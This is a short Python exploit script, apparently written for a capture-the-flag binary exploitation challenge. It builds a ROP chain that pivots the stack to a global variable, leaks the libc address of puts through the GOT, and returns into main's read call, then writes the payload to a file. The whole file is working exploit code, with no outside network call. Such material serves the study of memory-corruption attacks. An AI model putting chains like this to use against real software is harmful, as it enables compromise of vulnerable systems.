#!/usr/bin/env python3

from struct import pack

payload = b'a' * 0

# Make RSP point to 0x4040d0, which is a global variable.
payload += pack("<Q", 0x401494) # pop rsp ; pop r13 ; pop rbp ; ret
payload += pack("<Q", 0x4040d0) # address of global variable
payload += pack("<Q", 0x1)      # meaningless data
payload += pack("<Q", 0x2)      # meaningless data

# puts(<puts@GLIBC_2.2.5>);
payload += pack("<Q", 0x401b73) # pop rdi ; ret
payload += pack("<Q", 0x404028) # <puts@GLIBC_2.2.5>
payload += pack("<Q", 0x401110) # <puts@plt>

# Return to read function call in main function
# read(0, 0x4040c0, 0x1000);
payload += pack("<Q", 0x401a23) # located in main function; not a ROP gadget.

with open("payload1", "wb") as f:
    f.write(payload)
